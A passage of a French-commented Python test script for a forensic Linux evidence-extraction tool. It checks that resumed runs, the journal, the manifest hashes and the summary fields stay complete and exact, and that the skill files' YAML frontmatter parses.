    pareil = open(repris, encoding="utf-8").read() == complet
    manques += not pareil
    print(f"  {'ok ' if pareil else 'MANQUE'}  {'journal coupé, faits rejoués':28s} "
          f"identiques à un passage d'un seul tenant")

    # Une reprise RÉUSSIE ne doit pas se détruire elle-même. Le journal est
    # rouvert en écriture à chaque passage : ce qu'on n'y recopie pas est
    # perdu. Le premier plantage était couvert, le SECOND ne l'était plus —
    # et c'est justement le cas où l'on reprend deux fois.
    jr = os.path.splitext(repris)[0] + "-reprise.jsonl"
    avant = sum(1 for _ in open(jr, encoding="utf-8"))
    man = os.path.splitext(repris)[0] + "-manifeste.json"
    pieces = len(json.load(open(man, encoding="utf-8"))["pieces_lues"])
    subprocess.run([sys.executable, os.path.join(SKILLS, "forensic-linux", "scripts", "extraire.py"),
                    R, "-o", repris, "--indicateurs", os.path.join(base, "indicateurs.txt")],
                   check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    apres = sum(1 for _ in open(jr, encoding="utf-8"))
    ok = apres == avant and avant > 1
    manques += not ok
    print(f"  {'ok ' if ok else 'MANQUE'}  {'le journal survit à la reprise':28s} "
          f"{apres} ligne(s), {avant} avant")
    # Et la preuve « quels octets ont été analysés » doit rester ENTIÈRE : une
    # pièce rejouée a bien été analysée, même si elle ne l'a pas été à ce
    # passage-ci. Sans cela le manifeste prétendait, en silence, qu'elle ne
    # l'avait pas été.
    apres_p = len(json.load(open(man, encoding="utf-8"))["pieces_lues"])
    ok = apres_p == pieces and pieces > 1
    manques += not ok
    print(f"  {'ok ' if ok else 'MANQUE'}  {'manifeste entier après reprise':28s} "
          f"{apres_p} pièces, {pieces} avant")
    # L'empreinte du manifeste est calculée PENDANT la lecture des indicateurs,
    # au lieu de relire toute la collecte une seconde fois après la dernière
    # phase — une passe complète de plus, en silence, sur un scellé à cent
    # mille pièces. Elle doit donc rester EXACTE, y compris après une reprise
    # où la pièce n'a pas été relue : c'est le journal qui la reporte alors.
    lues = json.load(open(man, encoding="utf-8"))["pieces_lues"]
    faux = [rel for rel, meta in lues.items()
            if hashlib.sha256(open(os.path.join(R, rel), "rb").read()).hexdigest()
            != meta["sha256"]
            or os.path.getsize(os.path.join(R, rel)) != meta["octets"]]
    ok = not faux and len(lues) > 10
    manques += not ok
    print(f"  {'ok ' if ok else 'MANQUE'}  {'empreintes du manifeste justes':28s} "
          f"{len(lues)} pièces vérifiées octet par octet"
          + (f", FAUSSES : {faux[:2]}" if faux else ""))

    print("\n── SYNTHÈSES : LES CHAMPS, PAS SEULEMENT LE LIBELLÉ ──")
    with open(faits, encoding="utf-8") as fh:
        lus_f = [json.loads(l) for l in fh if l.strip()]
    for artefact, exige in ATTENDUS_CHAMPS:
        # « __absent__ » : aucun fait ne doit porter ce champ. C'est l'inverse
        # du reste, et c'est ce qui permet de tester qu'un mécanisme a bien
        # DISPARU — un test qui ne sait dire que « présent » laisse revenir en
        # silence ce qu'on vient de retirer.
        interdit = exige.get("__absent__")
        # « __jamais__ » : un dict {champ: valeur} qu'AUCUN fait ne doit porter
        # en entier. C'est ainsi qu'on teste qu'une chose vraie ailleurs ne
        # s'est pas glissée là où elle serait un contresens. La comparaison est
        # EXACTE, à rebours du reste : « www.yggtor » est un morceau du
        # légitime « www.yggtorrent.wtf », et une recherche par sous-chaîne
        # sonnerait l'alarme sur le fait même qu'elle doit laisser passer.
        # « __compte__ » : (libellé de fait, nombre) — il doit y en avoir
        # EXACTEMENT autant. C'est la seule forme qui attrape une troncature :
        # une borne laisse toujours passer les premières lignes, donc une
        # recherche par présence trouve ce qu'elle cherche et ne voit rien.
        compte = exige.get("__compte__")
        jamais = exige.get("__jamais__")
        if compte:
            quoi, attendu = compte
            vu = sum(1 for d in lus_f if d.get("fait") == quoi)
            ok = vu == attendu
            etiquette = f"{vu} « {quoi} » (attendu {attendu})"
        elif jamais:
            ok = not any(all(d.get(k) == v for k, v in jamais.items())
                         for d in lus_f)
            etiquette = " + ".join(f"{k}={v}" for k, v in jamais.items())
        elif interdit:
            ok = not any(interdit in d for d in lus_f)
            etiquette = interdit
        else:
            ok = any(all(v in str(d.get(k, "")) for k, v in exige.items()) for d in lus_f)
            etiquette = (exige.get("valeur") or exige.get("source")
                         or exige.get("horodatage") or exige.get("fait"))
        manques += not ok
        print(f"  {'ok ' if ok else 'MANQUE'}  {artefact:28s} {etiquette}")

    print(f"\n── PIÈCES QUI SURVIVENT AU VIDAGE DE L'HISTORIQUE ──")
    with open(constats, encoding="utf-8") as fh:
        lus = [json.loads(l) for l in fh if l.strip()]
    for artefact, _cle, exige in ATTENDUS_PRECIS:
        ok = any(all(v in str(d.get(k, "")) for k, v in exige.items()) for d in lus)
        manques += not ok
        print(f"  {'ok ' if ok else 'MANQUE'}  {artefact:28s} {exige['source']}")

    racine = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    print("\n── FRONTMATTER DES SKILL.md ──")
    ennuis = frontmatter_sain(racine)
    for chemin, motif in ennuis:
        print(f"  MANQUE  {os.path.basename(os.path.dirname(chemin)):<20} {motif}")
    manques += len(ennuis)
    if not ennuis:
        print("  ok      les frontmatter passent un analyseur YAML")

    print(f"\n{base}")
    if manques:
        print(f"{manques} artefact(s) collecté(s) mais sans effet — voir ci-dessus.",
              file=sys.stderr)
    return 1 if manques else 0


if __name__ == "__main__":
    sys.exit(main())
